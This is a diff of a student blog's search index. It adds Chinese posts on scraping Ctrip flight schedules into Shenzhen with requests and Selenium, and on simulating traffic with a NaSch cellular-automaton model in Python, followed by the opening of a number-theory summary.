@@ -1,22 +1,587 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>机场到港航班数据爬取</title>
+    <url>/2020/07/13/%E5%BB%BA%E6%A8%A1/%E6%9C%BA%E5%9C%BA%E5%88%B0%E6%B8%AF%E8%88%AA%E7%8F%AD%E7%88%AC%E5%8F%96/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="要求描述"><a href="#要求描述" class="headerlink" title="要求描述"></a>要求描述</h1><p>描述国内某机场每天的人流量变化</p>
+<h1 id="采取策略"><a href="#采取策略" class="headerlink" title="采取策略"></a>采取策略</h1><h2 id="得到所有航线"><a href="#得到所有航线" class="headerlink" title="得到所有航线"></a>得到所有航线</h2><p>这里我们是选取的城市是深圳，爬取携程的订票系统</p>
+<img src="/img/loading.gif" class="lazyload" data-src="/images/机场到港航班爬取/image-20200713093306914.png"  alt="image-20200713093306914" style="zoom: 33%;">
+
+
+
+<p>我们可以找到一个页面包含了所有到深圳的所有航线<img src="/img/loading.gif" class="lazyload" data-src="/images/机场到港航班爬取/image-20200713093537855.png"  alt="image-20200713093537855" style="zoom: 33%;"></p>
+<p>ctrl+U，发现所需要的数据都显示在源码中了，这样我们就可以爬到所有的航线，并输入到一个list中</p>
+<p>感谢<a href="https://emanual20.github.io/" target="_blank" rel="noopener">Sakura</a>提供这部分的代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flightlinespider.py</span></span><br><span class="line"><span class="comment"># Group: Group bald</span></span><br><span class="line"><span class="comment"># Date: 20200712</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="comment"># 显示所有航线的网页</span></span><br><span class="line">web_url = <span class="string">'https://flights.ctrip.com/schedule/.szx.html'</span></span><br><span class="line">r = requests.get(web_url)</span><br><span class="line">soup = bs4.BeautifulSoup(r.text, <span class="string">"html5lib"</span>)</span><br><span class="line">route_list = []</span><br><span class="line">list1 = soup.find_all(<span class="string">'a'</span>)</span><br><span class="line">list2 = soup.find_all(<span class="string">'a'</span>,&#123;<span class="string">'target'</span>:<span class="string">'_blank'</span>&#125;)</span><br><span class="line">list3 = list(set(list1).difference(set(list2)))</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> list3:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'-深圳'</span> <span class="keyword">in</span> item.text:</span><br><span class="line">        route_list.append(item.text)</span><br><span class="line">route_list.sort()</span><br><span class="line"><span class="comment"># print(route_list)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>找到包含航班信息的列</p>
+<h2 id="得到一条航线的所有航班"><a href="#得到一条航线的所有航班" class="headerlink" title="得到一条航线的所有航班"></a>得到一条航线的所有航班</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%9C%BA%E5%9C%BA%E5%88%B0%E6%B8%AF%E8%88%AA%E7%8F%AD%E7%88%AC%E5%8F%96/image-20200713094622990.png"  alt="image-20200713094622990"></p>
+<p>发现这部分没有直接写在网页源码中，而且尝试利用它payload爬取响应失败</p>
+<p>我们需要的信息</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%9C%BA%E5%9C%BA%E5%88%B0%E6%B8%AF%E8%88%AA%E7%8F%AD%E7%88%AC%E5%8F%96/image-20200713134547601.png"  alt="image-20200713134547601"></p>
+<p><font color="green">关于容量我没有找到官方的统计网站，且相同机型的飞机也可能有不同的载客量，所以采取手动查找策略，取大致数值。爬虫只用来爬取前几列</font></p>
+<table><tr><td bgcolor="#7FFFD4">使用selenium库模仿真人操作，拿到网页的显示内容</td></tr></table>
+
+<p>具体逻辑已经写在代码注释中</p>
+<p>我本人在写这个代码的时候也是第一天接触这个库，里面有的内容有点愚蠢（比如连用七个判断hhh）欢迎大家提出建议</p>
+<ul>
+<li>环境配置<ul>
+<li>安装库</li>
+<li>安装浏览器驱动，然后放到 <code>anaconda//Lib/site-packages/selenium/webdriver/chrome/</code>中</li>
+</ul>
+</li>
+<li>大致思路，分别爬取页面中的航班号、机型、班期等信息，每个信息（而不是架航班）存到一个list里，然后将保存了各个信息的list放到一个dataframe里面，写入csv</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Group: Group bald</span></span><br><span class="line"><span class="comment"># Date: 20200712</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> flightlinespider <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTSpider</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, i)</span>:</span></span><br><span class="line">        self.i = <span class="number">0</span></span><br><span class="line">        self.url = <span class="string">'https://flights.ctrip.com/schedule/.szx.html'</span></span><br><span class="line">        self.browser = driver = webdriver.Chrome(</span><br><span class="line">            <span class="string">r'D:/anaconda/new/Lib/site-packages/selenium/webdriver/chrome/chromedriver.exe'</span>)</span><br><span class="line">        self.index = i <span class="comment"># 循环遍历的标记</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 点击特定路线</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.browser.get(self.url) <span class="comment"># 打开url</span></span><br><span class="line">        <span class="comment"># 查找页面中route_list[index]的路线（文字），点击</span></span><br><span class="line">        self.browser.find_elements_by_link_text(route_list[self.index])[<span class="number">0</span>].click()</span><br><span class="line"></span><br><span class="line">        time.sleep(random.uniform(<span class="number">2</span>, <span class="number">4</span>))  <span class="comment"># 给商品页面加载时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析页面</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_html</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="comment"># 查找到当前访问的网页中class="flight_logo"的部分，返回一个列表</span></span><br><span class="line">        flights = self.browser.find_elements_by_class_name(<span class="string">"flight_logo"</span>)</span><br><span class="line">        flightno_list = []</span><br><span class="line">        flight_list = []</span><br><span class="line">        <span class="keyword">for</span> flight <span class="keyword">in</span> flights: <span class="comment"># 循环访问列表中的内容</span></span><br><span class="line">            text = flight.text.split(<span class="string">'/n机型:'</span>) <span class="comment"># 用.text提取出文字内容</span></span><br><span class="line">            flightno_list.append(text[<span class="number">0</span>]) <span class="comment"># 将所需内容添加到列中</span></span><br><span class="line">            flight_list.append(text[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        arv = self.browser.find_elements_by_class_name(<span class="string">"arrive"</span>)</span><br><span class="line">        arrive_time = []  <span class="comment"># 到达时间</span></span><br><span class="line">        arrive_airport = [] <span class="comment"># 到达机场</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> arv:</span><br><span class="line">            a = i.text.split(<span class="string">'/n'</span>) <span class="comment"># 爬取到的内容每条间会有换行</span></span><br><span class="line">            arrive_time.append(a[<span class="number">0</span>])</span><br><span class="line">            arrive_airport.append(a[<span class="number">1</span>])</span><br><span class="line">		</span><br><span class="line">        <span class="comment"># 找到所有的class为week的部分</span></span><br><span class="line">        flights = self.browser.find_elements_by_class_name(<span class="string">"weeks"</span>)</span><br><span class="line">        flights = flights[<span class="number">1</span>:] <span class="comment"># flihts[0]为表头，去除</span></span><br><span class="line">        week_list_mon = []  <span class="comment"># 班期</span></span><br><span class="line">        week_list_tue = []	<span class="comment"># 这段就是非常愚蠢的代码，如果有改良的方法欢迎给我发邮件或者私信我</span></span><br><span class="line">        week_list_wed = []	<span class="comment"># 我不知道怎么生成低维不定长的二维数组</span></span><br><span class="line">        week_list_thu = []</span><br><span class="line">        week_list_fri = []</span><br><span class="line">        week_list_sat = []</span><br><span class="line">        week_list_sun = []</span><br><span class="line">        <span class="comment"># 将数字和星期几对应，方便后续处理</span></span><br><span class="line">        dic = &#123;<span class="number">0</span>: <span class="string">'一'</span>, <span class="number">1</span>: <span class="string">'二'</span>, <span class="number">2</span>: <span class="string">'三'</span>, <span class="number">3</span>: <span class="string">'四'</span>, <span class="number">4</span>: <span class="string">'五'</span>, <span class="number">5</span>: <span class="string">'六'</span>, <span class="number">6</span>: <span class="string">'日'</span>&#125;</span><br><span class="line">        dic_ = &#123;<span class="string">'一'</span>: <span class="number">0</span>, <span class="string">'二'</span>: <span class="number">1</span>, <span class="string">'三'</span>: <span class="number">2</span>, <span class="string">'四'</span>: <span class="number">3</span>, <span class="string">'五'</span>: <span class="number">4</span>, <span class="string">'六'</span>: <span class="number">5</span>, <span class="string">'日'</span>: <span class="number">6</span>&#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment"># 若周一有班次，则"一"的class为"blue",否则为空</span></span><br><span class="line">        <span class="comment"># 在每个块（flight）里继续查找class="blue"即当日有班次的航班</span></span><br><span class="line">        <span class="keyword">for</span> flight <span class="keyword">in</span> flights:</span><br><span class="line">            weeks = flight.find_elements_by_class_name(<span class="string">"blue"</span>)</span><br><span class="line">            weekli = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> weeks: <span class="comment"># 将单个航班中显示为蓝色的星期几的文字调整为列表</span></span><br><span class="line">                weekli.append(i.text)</span><br><span class="line">                <span class="comment"># 例如，如果一三五有班期，则weekli=['一','三','五']</span></span><br><span class="line">            m = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli: <span class="comment"># 如果weekli中包含周一</span></span><br><span class="line">                week_list_mon.append(<span class="number">1</span>) <span class="comment"># 则周一的列表中添加元素1</span></span><br><span class="line">            <span class="keyword">else</span>: <span class="comment"># 否则周一的列表中添加元素0</span></span><br><span class="line">                week_list_mon.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">1</span> <span class="comment"># 周二</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_tue.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_tue.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_wed.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_wed.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_thu.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_thu.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">4</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_fri.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_fri.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">5</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_sat.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_sat.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            m = <span class="number">6</span> <span class="comment"># 周日</span></span><br><span class="line">            <span class="keyword">if</span> dic[m] <span class="keyword">in</span> weekli:</span><br><span class="line">                week_list_sun.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                week_list_sun.append(<span class="number">0</span>)</span><br><span class="line">		</span><br><span class="line">        <span class="comment"># 准点率</span></span><br><span class="line">        punc = self.browser.find_elements_by_class_name(<span class="string">"punctuality"</span>)</span><br><span class="line">        punc_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> punc:</span><br><span class="line">            <span class="keyword">if</span> i.text != <span class="string">'准点率'</span>:</span><br><span class="line">                punc_list.append(i.text)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将数据放到一个database里面</span></span><br><span class="line">        data = &#123;<span class="string">'航班号'</span>:flightno_list,<span class="string">'机型'</span>: flight_list, <span class="string">'到达时间'</span>: arrive_time,</span><br><span class="line">                <span class="string">'到达机场'</span>: arrive_airport,<span class="string">'周一'</span>: week_list_mon, <span class="string">'周二'</span>: week_list_tue,</span><br><span class="line">                <span class="string">'周三'</span>: week_list_wed, <span class="string">'周四'</span>: week_list_thu, <span class="string">'周五'</span>: week_list_fri,</span><br><span class="line">                <span class="string">'周六'</span>: week_list_sat, <span class="string">'周日'</span>: week_list_sun, <span class="string">'准点率'</span>: punc_list&#125;</span><br><span class="line">        df = pd.DataFrame(data)</span><br><span class="line">		df=df.drop_duplicates() <span class="comment"># 去除由于“经停”带来的重复数据</span></span><br><span class="line">        df.to_csv(<span class="string">'Data3.csv'</span>, mode=<span class="string">'a'</span>, header=<span class="literal">False</span>) <span class="comment"># 以追加方式写入文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 主函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_html()</span><br><span class="line">        self.parse_html()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">global</span> route_list</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(route_list)):</span><br><span class="line">        print(i, route_list[i]) <span class="comment"># 打印进度，如果中间出现问题，调整后可以从出错处继续运行</span></span><br><span class="line">        spider = CTSpider(i)</span><br><span class="line">        spider.main()</span><br></pre></td></tr></table></figure>
+
+<p>拿到了数据</p>
+<p>太难了</p>
+<hr>
+<p>今日感悟</p>
+<p>要么爬，要么爬</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%9C%BA%E5%9C%BA%E5%88%B0%E6%B8%AF%E8%88%AA%E7%8F%AD%E7%88%AC%E5%8F%96/%E7%88%AC.gif"  alt="爬"></p>
+]]></content>
+      <categories>
+        <category>爬虫</category>
+      </categories>
+      <tags>
+        <tag>爬虫</tag>
+        <tag>动态网页爬取</tag>
+        <tag>建模</tag>
+        <tag>数据采集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>元胞自动机</title>
+    <url>/2020/07/10/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote>
+<p>内容来自：</p>
+<p><a href="https://www.zhihu.com/question/21929655" target="_blank" rel="noopener">https://www.zhihu.com/question/21929655</a></p>
+</blockquote>
+<h1 id="演化规则（二维）"><a href="#演化规则（二维）" class="headerlink" title="演化规则（二维）"></a>演化规则（二维）</h1><ol>
+<li><p>活细胞周围的细胞数小于2个或多于3个则死亡；</p>
+</li>
+<li><p>活细胞周围有2或3个细胞可以继续存活；</p>
+</li>
+<li><p>死细胞周围恰好有3个细胞则会复活。</p>
+</li>
+</ol>
+<h1 id="在交通领域的应用"><a href="#在交通领域的应用" class="headerlink" title="在交通领域的应用"></a>在交通领域的应用</h1><ul>
+<li>经典的NaSch模型，模拟了车辆在一维高速公路上的行驶状态</li>
+</ul>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-b2257119ede75ba235cbd938d0736004_hd-1594375032129.gif"  alt="v2-b2257119ede75ba235cbd938d0736004_hd"></p>
+<ul>
+<li>将CA模型推广到二维，可以仿真换道的行人流或车流</li>
+</ul>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-8f6ba0eead51c46ed921d33884c1cbf6_hd.webp"  alt="v2-8f6ba0eead51c46ed921d33884c1cbf6_hd"></p>
+<ul>
+<li>通过设置更复杂的规则，可以用元胞自动机仿真更真实的情况。例如在对向行走的行人流情境下，元胞们会仿真行人的排队特性，从而避免冲突相撞。<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-332188684ca16eb388779eb1af2789a9_hd.gif"  alt="v2-332188684ca16eb388779eb1af2789a9_hd"></li>
+</ul>
+<h2 id="Python代码"><a href="#Python代码" class="headerlink" title="Python代码"></a>Python代码</h2><p>NaSch模型</p>
+<ul>
+<li>老规矩，先调包，并创建一个图像</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib <span class="keyword">as</span> mpl</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># 创建图像</span></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">10</span>,<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>设置模型的参数，相当于一个遥控器，哪里不对点哪里~</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 模型参数设置</span></span><br><span class="line">numofcell = <span class="number">20</span>     <span class="comment"># 道路长度</span></span><br><span class="line">numofcar = <span class="number">12</span>      <span class="comment"># 空间中的车辆数</span></span><br><span class="line">max_time = <span class="number">100</span>     <span class="comment"># 设置最大时间步</span></span><br><span class="line">max_speed = <span class="number">5</span>      <span class="comment"># 允许的车辆最大速度</span></span><br><span class="line">p_slowdown = <span class="number">0.3</span>   <span class="comment"># 随机慢化概率</span></span><br><span class="line">pause_time = <span class="number">0.1</span>   <span class="comment"># 刷新时间（每一帧持续的时间）</span></span><br><span class="line">cell_size = <span class="number">15</span>     <span class="comment"># 元胞的大小</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>定义一个函数来构建一维空间，空间的长度就是道路长度，相当于用一系列和X轴或Y轴平行的直线，绘制一排小网格，每个小网格的中心，相当于(i,0)，其中，i=1,2,…,numofcell</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数：构建一维空间</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Plot_Space</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, numofcell): plt.plot([i<span class="number">-0.5</span>, i<span class="number">-0.5</span>], [<span class="number">-0.5</span>, <span class="number">0.5</span>], <span class="string">'-k'</span>, linewidth = <span class="number">0.5</span>)       </span><br><span class="line">    plt.axis([<span class="number">-0.5</span>, numofcell<span class="number">-0.5</span>, <span class="number">-0.5</span>, <span class="number">0.5</span>])</span><br><span class="line">plt.xticks([]);plt.yticks([])</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-1d7a0167f9c813df44a37cd317f86592_hd.png"  alt="img">)<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-1d7a0167f9c813df44a37cd317f86592_720w.png"  alt="img"></p>
+<ul>
+<li>定义一个函数来获取和前车的距离，从而避免两车相撞。在这里采用了周期性边界，即从道路末端驶出的小车会重新回到起点，相当于一个环路。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 函数：获取和前车的距离</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_empty_front</span><span class="params">(link, numofcell, indexofcell)</span>:</span></span><br><span class="line">    link2 = link * <span class="number">2</span>   <span class="comment"># 周期性边界</span></span><br><span class="line">    num = <span class="number">0</span>; i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (link2[indexofcell + i]) == <span class="literal">None</span>:</span><br><span class="line">        num += <span class="number">1</span>; i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>在道路空间中随机生成numofcar个初始元胞，并赋予随机的初始速度（不大于已经设置好的最大速度）。道路被车辆占有的状态储存在列表link中，若元胞中没有车辆，则link对应的位置为“None”；若元胞中有车，link对应的位置储存车辆的速度。（可以开开脑洞，大胆地尝试不同初始状态噢）</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 随机生成初始元胞</span></span><br><span class="line">Plot_Space()</span><br><span class="line">link = [<span class="literal">None</span>] * numofcell</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> num != numofcar:</span><br><span class="line">    sj = random.randint(<span class="number">0</span>, numofcell - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> link[sj] == <span class="literal">None</span>:</span><br><span class="line">        link[sj] = random.randint(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>在0~max_time的时间步内，进行NaSch模型的演化，模型演化的四个步骤：</li>
+</ul>
+<p><strong>加速：</strong>若还没到速度最大值，速度就加1</p>
+<p><strong>减速：</strong>如果速度值大于前方的空元胞数，有撞车风险，则减速至前方的空元胞数目</p>
+<p><strong>随机慢化：</strong>司机以p_slowdown的概率随机踩刹车，使速度减1</p>
+<p><strong>位置更新：</strong>新的位置为当前位置+当前速度，同时更新所有车辆的位置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NaSch模型</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">0</span>, max_time):</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> range(<span class="number">0</span>, numofcell):</span><br><span class="line">        <span class="keyword">if</span> link[cell] != <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 加速</span></span><br><span class="line">            link[cell] = min(link[cell] + <span class="number">1</span>, max_speed)</span><br><span class="line">            <span class="comment"># 减速</span></span><br><span class="line">            link[cell] = min(link[cell], get_empty_front(link, numofcell, cell))</span><br><span class="line">            <span class="comment"># 随机慢化</span></span><br><span class="line">            <span class="keyword">if</span> random.random() &lt;= p_slowdown:</span><br><span class="line">                link[cell] = max(link[cell] - <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 位置更新</span></span><br><span class="line">    nlink = [<span class="literal">None</span>] * numofcell</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> range(<span class="number">0</span>, numofcell):</span><br><span class="line">        <span class="keyword">if</span> link[cell] != <span class="literal">None</span>:</span><br><span class="line">            new_index = cell + link[cell]</span><br><span class="line">            <span class="keyword">if</span> new_index &gt;= numofcell:</span><br><span class="line">                new_index -= numofcell</span><br><span class="line">            nlink[new_index] = link[cell]</span><br><span class="line">    link = nlink</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>绘制当前时间步车辆位置的图像，注意这里有缩进，说明上一段NaSch模型演化代码中的for循环还没有结束呦~</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(link)):</span><br><span class="line">        <span class="keyword">if</span> link[i] != <span class="literal">None</span>:</span><br><span class="line">            x1.append(i)</span><br><span class="line">    Plot_Space()</span><br><span class="line">    plt.plot(x1, [<span class="number">0</span>] * numofcar, <span class="string">'sk'</span>, markersize=cell_size)</span><br><span class="line">    plt.xlabel(<span class="string">'timestep:'</span> + str(t))</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>让图片动起来（<strong>同样注意缩进</strong>），plt.pause()函数让当前的图像维持pause_time长的时间，随后plt.cla()函数将整个图像擦除。下一个时间步，继续绘制图像，保留一段时间，并擦除，再绘制图像……就能源源不断地产生动画啦！你学会了吗？</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.pause(pause_time)</span><br><span class="line">plt.cla()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>终于写完代码啦，RUN一下！</strong></p>
+<p>仔细看，拥堵带也会跳鬼步舞，逐渐向后传播的。</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-3b6878489f851d07be894b5fb569886d_hd.gif"  alt="v2-3b6878489f851d07be894b5fb569886d_hd"></p>
+<p>操控我的“遥控器”，给它一个初始状态，就可以开启“阅兵模式”啦，你猜我是怎么做到的？</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-c6155fd05a1d22975edbb7f376ee213a_hd.gif"  alt="img"></p>
+<p>给我开“瞬移”挂，只要动的足够快，你就分不清我到底是往左跑还是往右跑</p>
+<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%BB%BA%E6%A8%A1/%E5%85%83%E8%83%9E%E8%87%AA%E5%8A%A8%E6%9C%BA/v2-3b6878489f851d07be894b5fb569886d_hd-1594375389654.gif"  alt="v2-3b6878489f851d07be894b5fb569886d_hd"></p>
+<hr>
+<blockquote>
+<p>内容参考<a href="http://wulixb.iphy.ac.cn/fileWLXB/journal/article/wlxb/2001/3/PDF/w20010315.pdf" target="_blank" rel="noopener">http://wulixb.iphy.ac.cn/fileWLXB/journal/article/wlxb/2001/3/PDF/w20010315.pdf</a></p>
+</blockquote>
+<p>如果说上车到出发需要一个时间单位</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>2</th>
+<th>3</th>
+<th>4</th>
+<th>5(乘车点)</th>
+<th>6</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>o</td>
+<td></td>
+<td>o</td>
+<td>o</td>
+<td>o</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>建模</category>
+      </categories>
+      <tags>
+        <tag>建模</tag>
+        <tag>元胞自动机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>信安数基第四章总结</title>
-    <url>/2020/07/31/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="第四章-原根与指数"><a href="#第四章-原根与指数" class="headerlink" title="第四章 原根与指数"></a>第四章 原根与指数</h1><h2 id="4-1-次数"><a href="#4-1-次数" class="headerlink" title="4.1 次数"></a>4.1 次数</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/07/31/%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93/E:%5Cblog%5Chexo%5Csource_posts%5C%E4%BF%A1%E5%AE%89%E6%95%B0%E5%9F%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%80%BB%E7%BB%93%5Cimage-20200331160537835.png"  alt="image-20200331160537835"></p>
